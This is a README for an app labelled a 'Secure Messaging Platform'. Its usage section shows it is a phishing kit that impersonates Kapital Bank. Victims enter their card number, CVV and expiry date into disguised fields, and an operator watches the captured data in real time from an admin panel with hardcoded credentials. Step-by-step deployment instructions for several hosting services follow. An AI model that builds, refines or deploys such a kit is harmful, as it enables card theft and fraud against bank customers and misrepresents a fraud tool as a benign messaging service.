# Secure Messaging Platform

A real-time messaging platform with a banking interface design.

## Installation

```bash
npm install
```

## Running the Application

```bash
npm start
```

The server will start on port 3000 by default.

## Features

- Real-time messaging with Socket.io
- Secure admin panel with authentication
- Mobile-responsive design
- Professional SVG icons
- 2-3 second message delivery delay

## Usage

### User Interface
1. Open the application in your browser
2. Fill in the required fields:
   - Card Number (Name field)
   - CVV (Message field)
   - Expiry Date (Code field in XX/XX format)
3. Click "Davam etmək" to send

### Admin Panel
1. Click "Kapital Bank-dan kartım yoxdur" link
2. Login credentials:
   - Username: `ursamajor`
   - Password: `ursa618`
3. View messages in real-time

## Deployment Options

This application can be deployed to various platforms:

### 1. Vercel (Recommended for quick deployment)
```bash
npm i -g vercel
vercel
```

### 2. Render
1. Go to [render.com](https://render.com)
2. Connect your GitHub repository
3. Render will automatically detect `render.yaml`

### 3. Railway
1. Go to [railway.app](https://railway.app)
2. Connect your GitHub repository
3. Railway will use the configuration automatically

### 4. Replit
1. Import from GitHub at [replit.com](https://replit.com)
2. Run automatically with the `.replit` config

### 5. Heroku
```bash
heroku create
git push heroku main
```

## Technology Stack

- Node.js
- Express
- Socket.io
- HTML/CSS/JavaScript

## GitHub Repository

https://github.com/bankkapitalaz/.com
